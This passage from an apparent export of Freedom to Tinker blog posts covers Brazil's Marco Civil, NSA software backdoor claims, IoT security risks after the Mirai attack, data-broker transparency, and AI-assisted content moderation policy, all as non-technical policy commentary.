violated) to complain and take down contents with sex and nudity. This way, reasons such as moral judgments or religious beliefs could operate as motivation to take down these contents and consequently violate the freedom of expression. This concern was widely expressed by civil society organizations but it seems that the problem was already solved once the article’s redaction was improved in the latest version of the Law Project (Feb/2014). The last modification that I would like to highlight here is a tricky one. The “business model freedom” has been introduced as a principle of the Internet use in Brazil. Apparently, this principle was introduced only to please the Telecom Industry by assuring that they will be able to keep their current billing practice of charging users according to different packets of access speed. The network neutrality principle, then, would not affect this current business practice. This would be the only concern of the Telecom industry against the net neutrality principle, at least as officially expressed. By solving this problem, the Marco Civil would be ready to get the approval in the House of Representatives, beating the Telecom lobby and keeping the network neutrality principle. This seemed to be the strategy adopted by Alessandro Molón, the project redactor in the House of Representatives. But the thing is that the inclusion of the “business model freedom” may open a battle of interpretation about what the network neutrality principle is as well as its scope and limitations. It might be a flaw in the law that threatens the net neutrality principle giving to Telecom firms the opportunity to challenge it in court. These backward steps in the Marco Civil text have undermined the support from activists and civil society organizations, what must be seen as a serious concern.A couple of days ago, right before the release of the Law Project latest version,a group of organizations that have strongly collaborated with the Marco Civil construction have published an open letter [port] pointing out these problems and suggesting solutions. With the exception of the redaction in the article 22th, none of those problems have been addressed by the new text. Consequently the group no longer supports the law project, at least in the way it currently is. I guess that the virtue of the Marco Civil – its power against political and economic interests that want to keep the internet under restrictive control – comes less from its content than from the process through which it was built. The text is a consolidated product of this process. Hence each change in the text that goes away from its original proposals undermines its support from civil society and points out to a dangerous path. E agora, José? This is the hard situation that the Marco Civil and its supporters are facing: by seeking the approval by the House of Representatives, the project risks losing its singularity. It is the result of a truly open collaborative process to which ordinary people, civil society organizations and firms had the chance to contribute. But now it has been changed by going through the traditional political process and it may lose its collaborative meaning. The early stage participants are fighting back and the end of this battle remains open. The following days will be decisive. Perhaps we may understand this frame as yet another sign pointing out to the representation crisis of traditional politics. It comes alongside with the multivariate street protests that are taking place in Brazil at least since last June. Furthermore, this is a challenge not only faced by Brazilian democracy. I would even say it is one of the main reasons why the Marco Civil experience has taken considerable international attention. It is a pioneering initiative of constructing a “Bill of Rights” to the Internet in a collaborative fashion. The result and the experience of this initiative, alongside with the Global Multistakeholder Meeting on the Future of Internet Governance to be held in São Paulo (Brazil), may help frame the crisis and its possible solutions."
"431","2013-12-19","2023-03-24","https://freedom-to-tinker.com/2013/12/19/software-backdoors-and-the-white-house-nsa-panel-report/","Yesterday the five-member panel appointed by the President to review “Intelligence and Communications Technologies” issued its report. The report is serious and substantial, and makes 46 specific recommendations for change. I expect to have a lot to say about the report and its aftermath, but for today I want to focus on one small aspect: what the report says about the possibility that the NSA inserted backdoors into software products. Here’s what the report says (p. 217): Upon review, however, we are unaware of any vulnerability created by the US Government in generally available commercial software that puts users at risk of criminal hackers or foreign governments decrypting their data. Moreover, it appears that in the vast majority of generally used, commercially available encryption software, there is no vulnerability , or “backdoor,” that makes it possible for the US Government or anyone else to achieve unauthorized access. [Footnote: Any cryptographic algorithm can become exploitable if implemented incorrectly or used improperly.] Obviously, the panel had neither the time nor the expertise to look at primary evidence on this point, so it must have relied on what the NSA told it. What is not clear is whether this text was wordsmithed by the panelists themselves, or whether it is based more directly on text provided by the NSA (for example, in NSA written responses to questions from the panel). It matters whether this precise text is the panel’s or the NSA’s. From the panel, I would expect a good faith effort to speak clearly. From the NSA, well, we have seen the word games they sometimes try to play. Turning to the text, the most interesting feature is the difference between the first and second sentences, which have parallel structure but use different language. Here’s a chart laying out the differences: First sentence Second sentence unaware of any vulnerability in vast majority … no vulnerability vulnerability created by USG [any vulnerability] generally available commercial software generally used, commercially available … software [any software] encryption software puts users at risk of [non-USG exploit] [exploitable by USG] or anyone else decrypting data unauthorized access This structure leaves open the possibility that there are vulnerabilities known to and exploitable by the US Government (USG). These might fall into several categories: vulnerabilities created by the USG that are exploitable only with the knowledge of a cryptographic key known only to the USG. An example would be the widely suspected backdoor in the NIST pseudorandom number generator standard. vulnerabilities created by the USG that allow access to data by means other than decryption, for example by allowing remote access to data at rest, or by causing copies of data to be sent to NSA collection points. vulnerabilities in software that is not generally available, such as internally developed software used by large companies to manage their data centers. vulnerabilities that are in non-encryption software and were not created by the USG. These would be outside the scope of both sentences. One also wonders about the limitations based on commercial status: “generally available commercial software” in the first sentence, and “generally used, commercially available … software” in the second sentence. One wonders how the people who chose those phrases would classify critical open source software such as Linux or OpenSSL. Are these “commercial software”? Even if not “commercial software”, are they “commercially available”? I can see two possibilities here. Perhaps this is imprecise drafting by the panel who might have intended to cover all of the relevant software but, being less familiar with the technical community, might have missed this nuance. Or perhaps this is one of the NSA’s word games, meant to leave a loophole. Finally, I am intrigued by the first part of the footnote (“… if implemented incorrectly”), which seems to miss the distinction between a cryptographic algorithm and cryptographic software. The implication is that a “cryptographic algorithm … implemented incorrectly” is somehow an exception to a statement about “encryption software”. As above, either the panel is missing a technical nuance, or something is hidden here. And if something is hidden, it is probably in the gap between the main text’s “encryption” and the footnote’s “cryptographic”. (The two terms are often used synonymously, although “cryptographic” has a broader technical meaning. For example, a digital signature is “cryptographic” but arguably it is not technically “encryption”.) The good news here is that the panel’s Recommendation 29 would broadly prevent the US Government from undermining crypto standards or the security of popular software—assuming that the recommendation is adopted by Congress or the President."
"432","2013-12-06","2023-03-24","https://freedom-to-tinker.com/2013/12/06/princeton-cs-research-on-secure-communications/","Continuing our series on security research here at Princeton Computer Science, I’d like to talk about how new information about government surveillance is driving research on how to secure communications. For a long time, users and companies have been slow to adopt secure, encrypted communication technologies. The new surveillance environment changes that, with companies racing to deploy security technologies. Mostly, they’re deploying known security measures rather than inventing new ones. At the same time, researchers are working on developing new security measures. Our work in this area falls into three main areas: understanding what is vulnerable to surveillance; making security practical for users; and reconciling appropriate surveillance with oversight. I can’t go into great detail in any area, due to limited space and because some of our results aren’t ready for publication yet, but I’ll try to give an idea of the kinds of things we’re doing in each area. First, understanding what is vulnerable to surveillance. It might seem obvious that we can just list the information that could be collected, and be done. But determining the scope of vulnerability is not so simple. This line of research involves thinking carefully about the limits of collectability, measuring what information real users emit that is collectable, and analyzing what can be inferred from this information. We have a couple of ongoing projects along these lines. Second, making security practical for users. Users often fail to use security technologies even when they are available. For example, few people encrypt and digitally sign their email, even though tools for doing so have been available for two decades; and few website operators offer the secure https-only access that security experts recommend. It seems that current security tools are too difficult to use. But attempts to solve the problem by just improving the user interface have not been successful, because the difficulties in using these tools seem to be inherent in the underlying security model. What we need is not just a better user interface but better underlying security technologies that change the playing field so that is becomes possible to adopt a natural user interface without losing security. We have a project along these lines that I’m excited about; but we’re not ready to unveil it quite yet. Third, reconciling appropriate surveillance with oversight. One of the reasons that U.S. surveillance policy has gone off the rails is that it is very difficult for the oversight bodies (the FISA Court, Congress, and the White House) to exercise their oversight duties in an environment where huge amounts of information are collected without much detailed information about programs and activities flowing back to the overseers. This is a problem of political process, of course, but I believe that technology can help to address it in several ways, for example by creating reporting regimes that inform overseers while protecting necessarily-secret information about detailed surveillance practices. We think it’s possible as well to change the way that information is collected and used in ways that reduce the risk of error or misuse of information, while at the same time allowing robust analysis when that is justified. On the one hand, this is a challenging area to work in because we have limited information about current practices; but at the same time the status quo offers many opportunities for improvement. This is an exciting time to be doing research on secure communications technologies. Regardless of where the current political debates go, it is clear that communications security has entered a new era, and new tools are needed. We are part of an active research community that is working to create those tools."
"433","2013-12-04","2023-03-24","https://freedom-to-tinker.com/2013/12/04/digital-radio-broadcasting-in-brazil-a-technopolitical-struggle/","On the last week of November/2013 the second edition of ESC took place in Rio de Janeiro, Brazil. ESC is the acronym to “Espectro, Sociedade e Comunicação” (Spectrum, Society and Communication); as the name suggests people in this meeting discussed a fair use of the Radio spectrum in order to empower society by the use of a multiple and free mean of communication: the digital radio broadcasting. Yes, the radio broadcasting is still important in many ways and not only in Brazil. At least since Bertolt Brecht (1898-1956) wrote “Radio as a means of communication” in 1932 there is a struggle related to the right to speak trough the radio waves. Communitarian and unlicensed free radios have been trying to survive despite the efforts from big communication groups to take them down. The radio spectrum scarcity has always been used as technical excuse to keep the communication power concentrated in fewer hands. But now this picture can be changed in Brazil. More than two years ago the Brazilian House of Representatives created a special commission to study the digitalization of the radio broadcasting in order to facilitate the choice of the standard that will be adopted nationally. No decision was taken until now mostly because there is a strong dispute between two technological standards. This dispute clearly is a technopolitical matter. The already established communication conglomerates support HD Radio lobbying in its favor through their class association ABRA (Brazilian Broadcasters Association). The HD Radio is a closed and proprietary standard, therefore broadcasters must pay a licensing fee to adopt the technology. Component manufacturers must get a license from patent holders and they are not able to adapt and change the standard. On the other hand DRM (Digital Radio Mondiale) is an Open Standard based on free hardware and software and has been supported by free radios as well as academic researchers. Given the openness of the DRM standard, the national industry would be able to produce the basic equipments and adapt the technology to some regional characteristics and necessities. In the Amazon region, for example, shortwave transmissions have an important role in connecting isolated locations within the rainforest. HD Radio does not work with shortwave transmission; DRM does. The radio broadcasting itself is changing its nature by being digitized. As we know very well the digital content is not restricted to sound, then new applications and features are being produced within the scope of digital radio. This convergence with information technologies makes the dispute even harder because at the end of the day we are talking about having a significant amount of the radio wave spectrum working with free and open technology that may transmit multimedia content. I cannot say for sure what the digital radio broadcasting will become from now but it seems that the Brecht proposals are still making sense: the “radio could be the most wonderful public communication system imaginable, a gigantic system of channels — could be, that is, if it were capable not only of transmitting but of receiving, of making the listener not only hear but also speak, not of isolating him but of connecting him”."
"434","2013-11-01","2023-03-24","https://freedom-to-tinker.com/2013/11/01/citp-call-for-fellows-postdocs-and-visiting-professor-for-2014-15/","The Center for Information Technology Policy is an interdisciplinary research center at Princeton that sits at the crossroads of engineering, the social sciences, law, and policy. CITP seeks Visiting Fellows and Postdoctoral Research Associates for the 2014-2015 academic year who work at the intersection of digital technology and public life, including computer science, sociology, public policy, engineering, economics, law, and civil service. These are one-year appointments, normally commencing on July 1. Applicants may be appointed as a Visiting Fellow, Visiting Researcher, or Postdoctoral Research Associate. CITP also seeks candidates for our Microsoft Visiting Professor of Information Technology Policy position. Applicants must be currently appointed faculty members at an academic institution. Individuals may be appointed to a one- or two-year term, based on their individual circumstances and availability. Our application process is open from November 1, 2013 through January 15, 2014. Click for details on the Postdoctoral Research Associate application Click for details on the Visiting Fellow application Click for details on the Microsoft Visiting Professor of Information Technology Policy application"
"435","2013-10-17","2023-03-24","https://freedom-to-tinker.com/2013/10/17/just-launched-equal-future-dispatches-on-social-justice-technology/","Hello, Freedom to Tinker readers! I’m writing to introduce a new resource that may be of interest to you. It’s called Equal Future, and is written by Robinson + Yu with the support of the Ford Foundation. From the About page: Equal Future is a resource on social justice and technology — a weekly newsletter and web site published by Robinson + Yu with support from the Ford Foundation. In an era of rapid technological change, hard-won victories of the social justice community are at risk. The key practical protections for our civil rights — from court cases that interpret the Bill of Rights, to landmark 20th century civil rights laws, to accepted notions of government and corporate behavior — were designed against a factual background different from the one we face today. Social justice depends on how governments and corporations reach the key decisions that reshape peoples’ lives. In housing, lending, health, employment, criminal justice and a host of other areas, those decisions are now being made with new tools and methods, that did not exist when core civil rights protections were established. Securing civil rights for the future will require making sure that these new systems, no less than the older ones they replace, reflect our shared values. Equal Future aims to lay the foundation for this new conversation, mapping the changing landscape within which the struggle for social justice and civil rights continues. We know that resources for social justice — including time and attention — are scarce, and we aim to use them well. Once a week, we offer a short and easily digested newsletter, which you can access by email or view on this site. Over time, we hope our work will become a library and point of reference for the community. We are always glad to receive feedback, tips and suggestions. Feel free to reach out to us."
"436","2013-09-05","2023-03-24","https://freedom-to-tinker.com/2013/09/05/axciom-opens-some-consumer-data-what-should-you-do/","Yesterday Axciom, a large data broker, rolled out their data transparency site, aboutthedata.com. The sites lets you view some data that Axciom has about you, including demographic data, family status, financials, commercial history, and shopping preferences. The site also lets you correct any errors in the data. It looks like you can modify the data arbitrarily, but the Terms of Use require that any modifications be truthful. Several people have asked how they should approach the site. Should they look? Should they correct errors? My thoughts are below. First, though, I should report on what I found when I inspected my own data. They had the basic demographic information about me pretty much correct. The information on my family’s finances was partially correct. The information on our shopping preferences was the least accurate, reflecting more or less what one would guess for the household of a person with my demographics and (purported) financial position. For example, you don’t have to be a genius to guess that a household containing a person my age buys “health and beauty” products from time to time. One thing that jumped out was their belief that our household is interested in “orthopedic-related products”. They claim to know this because of “surveys”. It’s very unlikely that any member of my household has revealed an interest in this sort of medical-related product in response to any survey. I suspect that they learned this purported fact about my household by other means. Or maybe they got bogus survey data. But enough about me. Let’s talk about whether it’s a good idea to correct errors in the data. For starters, you don’t have any obligation to help Axciom get more accurate information about you. If you see an error and choose not to correct it, you are not in a state of sin. That said, you might benefit from correcting certain types of errors, for example to remove incorrect information that is embarrassing or tends to lead to unwanted commercial offers. Certainly, any errors that tend to show you in a bad light should probably be corrected. A more interesting question is what happens when people “correct” data in a way that deliberately introduces errors. The site’s Terms of Use prohibit this (“you further certify that any information you provide is accurate and complete”), so I will advise you against doing it. Don’t try this at home, people! Still, not having been born yesterday, I recognize that some people will provide false “corrections.” If this is widespread, it could jeopardize the commercial value of Axciom’s database. After all, the value of the database is diminished if the contents are inaccurate. Axciom could try to fight false corrections by using some kind of big-dataish algorithm to reject suspicious-looking corrections. Essentially, they would have some kind of model of which kinds of household data configurations are plausible, and they would reject corrections that are implausible according to their model. I can’t find anything in the site information that says that Axciom might ignore the corrections you submit—indeed, one of their main pitches for the site is that you can correct the data. But actually, they don’t quite say that you can “correct” the data. What they say is that you can “edit” the data. Which makes one suspect that they retain the original data, and just add a notation that you edited the data to say something else, at a particular date and time. Close reading of the site suggests that this might be the case—in particular, explanatory text on the categories page says that “Changes will be kept for 24 months from date of change” which suggests that changes are stored separately from the original data such that the changes can somehow be rolled back or removed from your record later. I’m curious what your experiences are with the site. How accurate is their data? What happens when you submit a correction/edit?"
"437","2013-06-03","2023-03-24","https://freedom-to-tinker.com/2013/06/03/joel-reidenberg-named-the-inaugural-microsoft-visiting-professor-of-information-technology-policy/","The Center for Information Technology Policy at Princeton is pleased to announce the appointment of the first-ever Microsoft Visiting Professor of Information Technology Policy. Professor Joel Reidenberg of Fordham Law School is a well-known scholar in internet law, privacy, and cybersecurity. While visiting, he will collaborate on research with the CITP community and teach an undergraduate course on internet law and policy. At Fordham he holds the Stanley D. and Nikki Waxberg Chair, and he is the Founding Academic Director of the Center on Law and Information Policy."
"438","2013-05-14","2023-03-24","https://freedom-to-tinker.com/2013/05/14/who-owns-the-future-not-the-middle-class/","Jaron Lanier, in the latest contribution to the public conversation about how we live with technology, blames the Internet for the fall of the middle class. Only the problem is he’s wrong. In his new book Who Owns the Future? Lanier–often described with the word visionary–argues that the information economy in general and network technologies in particular are to blame for the plight of the middle class. I haven’t read the entire book yet (that will have to wait until after my team puts in our proposal to NSF’s Smart and Connected Health ). I suspect I will agree the political spirit of much of what Lanier writes, but on this point I have to push back now, even at the risk of missing the subtlety of his full argument. We probably agree on many points, but this one is crucial to tease out because of it’s political implications. In Venture Labor I traced why seemingly rational, well-educated young people rushed to be a part of the first wave of dot-coms in the 1990s and early 2000s. My point was the entrepreneurial spirit of the dot-com era was a response to growing job insecurity, not the cause of it. Young graduates of the 1990s found that risky Internet startups offered the best options in an economy that increasingly felt (and was) closed off to them. They acted as “venture labor,” risking layoffs in the hopes of a future stock payout because they had, relatively speaking, few other choices. Technology itself was not the cause for the disruption in the U.S. labor market that limited entry-level jobs and made work in general less secure and more contingent. Tech giants Kodak and IBM once offered stable long-term careers with the best benefits in America. The layoffs there and elsewhere that reshaped corporate America and eliminated hundreds of thousands of middle-class jobs began before there was even a commercial World Wide Web. The blustery rhetoric of Internet innovation saving a tired, weakened American economy was not possible without the tropes and metaphors that Ronald Reagan introduced into political speech in the 1980s. The challenges the middle class faced then and continue to struggle with are not the result of technological change but broad economic and political shifts that began well before html. Tom Streeter has called the spirit of the dot-com era “Romantic” (as in Henry David Thoreau, not Match.com; a dialogue on Streeter’s book edited by yours truly is over at Culture Digitally). The romantic individualism that pervades the culture of the Internet means that that these responses to economic change were talked about in terms of rugged individualism and self-fulfillment, not in terms collective or social. That’s not accidental. A generation of layoffs, political rhetoric about the virtues of good ol’ American risk-taking, fatally weakened labor unions, and permanently slowed job growth. In other words, social responses to economic problems lost traction and a cultural vision of rugged individualism and entrepreneurial pluck saving the economy won. This brings us back to the point of Lanier’s book. We have many reasons to be politically suspicious of Big Data and Moore’s Law. But hanging the collapse of middle class wages on these phenomena, as Lanier does, hides the fact that the problem has been with us longer than the Internet has. Take this passage from Lanier in an interview in Salon with the very smart Scott Timberg who writes on jobs in cultural industries: The way society actually works is there’s some mechanism of basic stability so that the majority of people can outspend the elite so we can have a democracy. That’s the thing we’re destroying, and that’s really the thing I’m hoping to preserve. So we can look at musicians and artists and journalists as the canaries in the coal mine, and is this the precedent that we want to follow for our doctors and lawyers and nurses and everybody else? Because technology will get to everybody eventually. In the book, Lanier writes that because “Networks need a great number of people to participate in them to generate significant value. But then, when you have them only a small number of people get paid. That has the net effect of centralizing wealth and limiting overall economic growth” (p 2). I applaud Lanier for pointing us to the woes of the economy as a dark side of the Silicon economy. But his blame for it on technology is very much misplaced. As Janet Maslin pointed out in her New York Times review of Who Owns the Future?, the book “may not provide many answers, but it does articulate a desperate need for them.” I, for one, am glad to see we’re finally talking about them."
"439","2017-02-18","2023-03-24","https://freedom-to-tinker.com/2017/02/18/mitigating-the-increasing-risks-of-an-insecure-internet-of-things/","The emergence and proliferation of Internet of Things (IoT) devices on industrial, enterprise, and home networks brings with it unprecedented risk. The potential magnitude of this risk was made concrete in October 2016, when insecure Internet-connected cameras launched a distributed denial of service (DDoS) attack on Dyn, a provider of DNS service for many large online service providers (e.g., Twitter, Reddit). Although this incident caused large-scale disruption, it is noteworthy that the attack involved only a few hundred thousand endpoints and a traffic rate of about 1.2 terabits per second. With predictions of upwards of a billion IoT devices within the next five to ten years, the risk of similar, yet much larger attacks, is imminent. The Growing Risks of Insecure IoT Devices One of the biggest contributors to the risk of future attack is the fact that many IoT devices have long-standing, widely known software vulnerabilities that make them vulnerable to exploit and control by remote attackers. Worse yet, the vendors of these IoT devices often have provenance in the hardware industry, but they may lack expertise or resources in software development and systems security. As a result, IoT device manufacturers may ship devices that are extremely difficult, if not practically impossible, to secure. The large number of insecure IoT devices connected to the Internet poses unprecedented risks to consumer privacy, as well as threats to the underlying physical infrastructure and the global Internet at large: Data privacy risks. Internet-connected devices increasingly collect data about the physical world, including information about the functioning of infrastructure such as the power grid and transportation systems, as well as personal or private data on individual consumers. At present, many IoT devices either do not encrypt their communications or use a form of encrypted transport that is vulnerable to attack. Many of these devices also store the data they collect in cloud-hosted services, which may be the target of data breaches or other attack. Risks to availability of critical infrastructure and the Internet at large. As the Mirai botnet attack of October 2016 demonstrated, Internet services often share underlying dependencies on the underlying infrastructure: crippling many websites offline did not require direct attacks on these services, but rather a targeted attack on the underlying infrastructure on which many of these services depend (i.e., the Domain Name System). More broadly, one might expect future attacks that target not just the Internet infrastructure but also physical infrastructure that is increasingly Internet- connected (e.g., power and water systems). The dependencies that are inherent in the current Internet architecture create immediate threats to resilience. The large magnitude and broad scope of these risks implore us to seek solutions that will improve infrastructure resilience in the face of Internet-connected devices that are extremely difficult to secure. A central question in this problem area concerns the responsibility that each stakeholder in this ecosystem should bear, and the respective roles of technology and regulation (whether via industry self-regulation or otherwise) in securing both the Internet and associated physical infrastructure against these increased risks. Risk Mitigation and Management One possible lever for either government or self-regulation is the IoT device manufacturers. One possibility, for example, might be a device certification program for manufacturers that could attest to adherence to best common practice for device and software security. A well-known (and oft-used) analogy is the UL certification process for electrical devices and appliances. Despite its conceptual appeal, however, a certification approach poses several practical challenges. One challenge is outlining and prescribing best common practices in the first place, particularly due to the rate at which technology (and attacks) progress. Any specific set of prescriptions runs the risk of falling out of date as technology advances; similarly, certification can readily devolve into a checklist of attributes that vendors satisfy, without necessarily adhering to the process by which these devices are secured over time. As daunting as challenges of specifying a certification program may seem, enforcing adherence to a certification program may prove even more challenging. Specifically, consumers may not appreciate the value of certification, particularly if meeting the requirements of certification increases the cost of a device. This concern may be particularly acute for consumer IoT, where consumers may not bear the direct costs of connecting insecure devices to their home networks. The consumer is another stakeholder who could be incentivized to improve the security of the devices that they connect to their networks (in addition to more effectively securing the networks to which they connect these devices). As the entity who purchases and ultimately connects IoT devices to the network, the consumer appears well-situated to ensure the security of the IoT devices on their respective networks. Unfortunately, the picture is a bit more nuanced. First, consumers typically lack either the aptitude or interest (or both!) to secure either their own networks or the devices that they connect to them. Home broadband Internet access users have generally proved to be poor at applying software updates in a timely fashion, for example, and have been equally delinquent in securing their home networks. Even skilled network administrators regularly face network misconfigurations, attacks, and data breaches. Second, in many cases, users may lack the incentives to ensure that their devices are secure. In the case of the Mirai botnet, for example, consumers did not directly face the brunt of the attack; rather, the ultimate victims of the attack were DNS service providers and, indirectly, online service providers such as Twitter. To the first order, consumers suffered little direct consequence as a result of insecure devices on their networks. Consumers’ misaligned incentives suggest several possible courses of action. One approach might involve placing some responsibility or liability on consumers for the devices that they connect to the network, in the same way that a citizen might be fined for other transgressions that have externalities (e.g., fines for noise or environmental pollution). Alternatively, Internet service providers (or another entity) might offer users a credit for purchasing and connecting only devices that it pass certification; another variation of this approach might require users to purchase ”Internet insurance” from their Internet service providers that could help offset the cost of future attacks. Consumers might receive credits or lower premiums based on the risk associated with their behavior (i.e., their software update practices, results from security audits of devices that they connect to the network). A third stakeholder to consider is the Internet service provider (ISP), who provides Internet connectivity to the consumer. The ISP has considerable incentives to ensure that the devices that its customer connects to the network are secure: insecure devices increase the presence of attack traffic and may ultimately degrade Internet service or performance for the rest of the ISPs’ customers. From a technical perspective, the ISP is also in a uniquely effective position to detect and squelch attack traffic coming from IoT devices. Yet, relying on the ISP alone to protect the network against insecure IoT devices is fraught with non-technical complications. Specifically, while the ISP could technically defend against an attack by disconnecting or firewalling consumer devices that are launching attacks, such an approach will certainly result in increased complaints and technical support calls from customers, who connect devices to the network and simply expect them to work. Second, many of the technical capabilities that an ISP might have at its disposal (e.g., the ability to identify attack traffic coming from a specific device) introduce serious privacy concerns. For example, being able to alert a customer to (say) a compromised baby monitor requires the ISP to know (and document) that a consumer has such a device in the first place. Ultimately, managing the increased risks associated with insecure IoT devices may require action from all three stakeholders. Some of the salient questions will concern how the risks can be best balanced against the higher operational costs that will be associated with improving security, as well as who will ultimately bear these responsibilities and costs. Improving Infrastructure Resilience In addition to improving defenses against the insecure devices themselves, it is also critical to determine how to better build resilience into the underlying Internet infrastructure to cope with these attacks. If one views the occasional IoT-based attack inevitable to some degree, one major concern is ensuring that the Internet Infrastructure (and the associated cyberphysical infrastructure) remains both secure and available in the face of attack. In the case of the Mirai attack on Dyn, for example, the severity of the attack was exacerbated by the fact that many online services depended on the infrastructure that was attacked. Computer scientists and Internet engineers should be thinking about technologies that can both potentially decouple these underlying dependencies and ensure that the infrastructure itself remains secure even in the event that regulatory or legal levers fail to prevent every attack. One possibility that we are exploring, for example, is the role that an automated home network firewall could play in (1) help- ing users keep better inventory of connected IoT devices; (2) providing users both visibility into and control over the traffic flows that these devices send. Summary Improving the resilience of the Internet and cyberphysical infrastructure in the face of insecure IoT devices will require a combination of technical and regulatory mechanisms. Engineers and regulators will need to work together to improve security and privacy of the Internet of Things. Engineers must continue to advance the state of the art in technologies ranging from lightweight encryption to statistical network anomaly detection to help reduce risk; similarly, engineers must design the network to improve resilience in the face of the increased risk of attack. On the other hand, realizing these advances in deployment will require the appropriate alignment of incentives, so that the parties that introduce risks are more aligned with those who bear the costs of the resulting attacks."
"440","2018-03-21","2023-03-24","https://freedom-to-tinker.com/2018/03/21/artificial-intelligence-and-the-future-of-online-content-moderation/","Yesterday in Berlin, I attended a workshop on the use of artificial intelligence in governing communication online, hosted by the Humboldt Institute for Internet and Society. Context In the United States and Europe, many platforms that host user content, such as Facebook, YouTube, and Twitter, have enjoyed safe harbor protections for the content they host, under laws such as Section 230 of the Communications Decency Act (CDA), the Digital Millenium Copyright Act (DMCA), and in Europe, Articles 12–15 of the eCommerce Directive. Some of these laws, such as the DMCA, provide immunity to platforms for copyright damages if the platforms remove content based on knowledge that it is unlawful. Section 230 of the CDA provides broad immunity to platforms, with the express goals of promoting economic development and free expression. Daphne Keller has a good summary of the legal landscape on intermediary liability. Platforms are now facing increasing pressure to detect and remove illegal (and, in some cases, legal-but-objectionable) content. In the United States, for example, bills in the House and Senate would remove safe harbor protection for platforms that do not remove illegal content related to sex trafficking. The European Union has also considering laws that would limit the immunity of platforms who do not remove illegal content, which in the EU includes four categories: child sex abuse, incitement to terrorism, certain types of hate speech, and intellectual property or copyright infringement. The mounting pressure on platforms to moderate online content coincides with increasing attention to algorithms that can automate the process of content moderation (“AI”) for the detection and ultimate removal of illegal (or unwanted) content. The focus of yesterday’s workshop was to explore questions surrounding the role of AI in moderating content online, and the possible implications of AI for the moderation of online content and how online content moderation is governed. Setting the Tone: Challenges for Automated Filtering Malavika Jayaram from Digital Asia Hub and I delivered the two opening “impulse statements” for the day. Malavika talked about some of the inherent limitations of AI for automated detection (with a reference to the infamous “Not Hot Dog” app) and pointed out some of the tools that platforms are being pressured to use automated content moderation tools. I spoke about our long line of research on applying machine learning to detect a wide range of unwanted traffic, ranging from spam to botnets to bulletproof scam hosting sites. I then talked about how the dialog has in some ways used the technical community’s past success in spam filtering to suggest that automated filtering of other types of content should be as easy as flipping a switch. Since spam detection was something we knew how to do, then surely the platforms could also ferret out everything from copyright violations to hate speech, right? In practice Evan Engstrom and I previously wrote about the difficulty of applying automated filtering algorithms to copyrighted content. In short, even with a database that matches fingerprints of audio and video content against fingerprints of known copyrighted content, the methods are imperfect. When framing the problem in terms of incitement to violence or hate speech, automated detection becomes even more challenging, due to “corner cases” such as parody, fair use, irony, and so forth. A recent article from James Grimmelmann summarizes some of these challenges. What I Learned Over the course of the day, I learned many things about automated filtering that I hadn’t previously thought about. Regulators and platforms are under tremendous pressure to act, based on the assumption that the technical problems are easy. Regulators and platforms alike are facing increasing pressure to act, as I previously mentioned. Part of the pressure comes from a perception that detection of unwanted content is a solved problem. This myth is sometimes perpetuated by the designers of the original content fingerprinting technologies, some of which are now in widespread use. But, there’s a big difference between testing fingerprints of content against a database of known offending content and building detection algorithms that can classify the semantics of content that has never been seen before. An area where technologists can contribute to this dialog is in studying and demonstrating the capabilities and limitations of automated filtering, both in terms of scale and accuracy. Technologists might study existing automated filtering techniques or design new ones entirely. Takedown requests are a frequent instrument for censorship. I learned about the prevalence of “snitching”, whereby one user may request that a platform take down objectionable content by flagging the content or otherwise complaining about it—in such instances, oppressed groups (e.g., Rohingya Muslims) can be disproportionately targeted by large campaigns of takedown requests. (It was not known whether such campaigns to flag content have been automated on a large scale, but my intuition is that they likely are.) In such cases, the platforms err on the side of removing content, and the process for “remedy” (i.e., restoring the content) can be slow and tedious. This process creates a lever for censorship and suppression of speech.The trends are troubling: according to a recent article, a year ago, Facebook removed 50 percent of content that Israel requested be removed; now that figure is 95 percent. Jillian York runs a site where users can report these types of takedowns, but these reports and statistics are all self-reported. A useful project might be to automate the measurement of takedowns for some portion of the ecosystem or group of users. The larger platforms share content hashes of unwanted content, but the database and process are opaque. About nine months ago, Twitter, Facebook, YouTube, and Microsoft formed the Global Internet Forum to Counter Terrorism. Essentially, the project relies on something called the Shared Industry Hash Database. It’s very challenging to find anything about this database online aside from a few blog posts from the companies, although it does seem in some way associated with Tech Against Terrorism.The secretive nature of the shared hash database and the process itself has a couple of implications. First, the database is difficult to audit—if content is wrongly placed in the database, removing it would appear next to impossible. Second, only the member companies can check content against the database, essentially preventing smaller companies (e.g., startups) from benefitting from the information. Such limits in knowledge could ultimately prove to be a significant disadvantage if the platforms are ultimately held liable for the content that they are hosting. As I discovered throughout the day, the opaque nature of commercial content moderation proves to be a recurring theme, which I’ll return to later. Different countries have very different definitions of unlawful content. The patchwork of laws governing speech on the Internet makes regulation complicated, as different countries have different laws and restrictions on speech. For example, “incitement to violence” or “hate speech” might mean a different thing in Germany (where Nazi propaganda is illegal) than it does in Spain (where it is illegal to insult the king) or France (which recently vowed to ferret out racist content on social media). When applying this observation to automated detection of illegal content, things become complicated. It becomes impossible to train a single classifier that can be applied generally; essentially, each jurisdiction needs its own classifier. Norms and speech evolve over time, often rapidly. Several attendees observed that most of the automated filtering techniques today boil down to flagging content based on keywords. Such a model can be incredibly difficult to maintain, particularly when it comes to detecting certain types of content such as hate speech. For one, norms and language evolve; a word that was innocuous or unremarkable today could take on an entirely new meaning tomorrow. Complicating matters further, sometimes people try to regain control in an online discussion by co-opting a slur; therefore, a model that bases classification on the presence of certain keywords can produce unexpected false positives, especially in the absence of context. Takeaways Aside from the information I learned above, I also took away a few themes about the state of online content moderation: There will likely always be a human in the loop. We must figure out what role the human should play. Detection algorithms are only as good as their input data. If the data is biased, if norms and language evolve, or if data is mislabeled (an even more likely occurrence, since a label like “hate speech” could differ by country), then the outputs will be incorrect. Additionally, algorithms can only detect proxies for semantics and meaning (e.g., an ISIS flag, a large swath of bare skin) but have much more difficulty assessing context, fair use, parody, and other nuance. In short, on a technical front, we have our work cut out for us. It was widely held that humans will always need to be in the loop, and that AI should merely be an assistive technology, for triage, scale, and improving human effectiveness and efficiency when making decisions about moderation. Figuring out the appropriate division of labor between machines and humans is a challenging technical, social, and legal problem. Governance and auditing is currently challenging because decision-making is secretive. The online platforms currently control all aspects of content moderation and governance. They have the data; nobody else has it. They know the classification algorithms they use and the features they use as input to those algorithms; nobody else knows them. They also are the only ones who have insight into the ultimate decision-making process. This situation is different from other unwanted traffic detection problems that the computer science research community has worked on, where it was relatively easy to get a trace of email spam or denial of service traffic, either by generating it or by working with an ISP. In this situation, everything is under lock and key.This lack of public access to data and information makes it difficult to audit the process that platforms are currently using, and it also raises important questions about governance: Should the platforms be the ultimate arbiter in takedown and 